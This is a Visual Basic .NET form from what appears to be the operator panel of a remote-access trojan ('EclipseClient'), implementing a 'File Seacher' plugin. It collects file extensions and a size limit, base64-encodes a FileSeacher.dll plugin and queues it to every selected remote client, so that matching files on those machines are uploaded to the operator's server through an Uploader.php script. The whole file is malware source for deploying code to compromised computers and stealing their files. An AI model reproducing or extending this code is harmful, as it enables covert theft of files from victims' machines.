Imports System.IO

Public Class FileSeacher
    Private Sub FileSeacher_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ToolStripStatusLabel1.Text = "Selected [" & AuthForm.Lv1.SelectedItems.Count & "]"
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Try
            Do While (ListBox1.SelectedItems.Count > 0)
                ListBox1.Items.Remove(ListBox1.SelectedItem)
            Loop
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim urle As String
        urle = ".jpg"
        Dim str3 As String = Interaction.InputBox("Add Extension", "File Seacher", urle)
        If (str3.Length = 0) Then
        Else
            If ListBox1.Items.Contains(str3) Then
            Else
                ListBox1.Items.Add(str3)
            End If
        End If
    End Sub

    Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        ListBox1.Items.Clear()
    End Sub



    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click

        If ListBox1.Items.Count > 0 Or NumericUpDown1.Value > 0 Then

            If Not Settings.UP Then
                Dim result As Integer = MessageBox.Show("This feature uses the Uploader.php file to upload files to the hosting" & vbCrLf & "do you wante continue ?", "FileSeacher", MessageBoxButtons.YesNo)
                Settings.UP = True
                If result = DialogResult.No Then Return
            End If



            Dim SBx As New System.Text.StringBuilder
            SBx.Clear()

            For Each Item As String In ListBox1.Items

                SBx.Append("|" & Item)

            Next


            Try
                Dim B As Byte() = SB("FSG" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\FileSeacher.dll")) & Settings.SPL & Settings.PHP & Settings.SPL & NumericUpDown1.Value.ToString & "000000" & Settings.SPL & SBx.ToString)
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
                Me.Close()
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try

        Else
            Me.Close()
        End If
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown1.ValueChanged

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Guna2CircleButton1_Click(sender As Object, e As EventArgs) Handles Guna2CircleButton1.Click
        Me.Close()
    End Sub

    Private Sub Guna2CircleButton2_Click(sender As Object, e As EventArgs) Handles Guna2CircleButton2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub guna2Panel1_Paint(sender As Object, e As PaintEventArgs) Handles guna2Panel1.Paint

    End Sub
End Class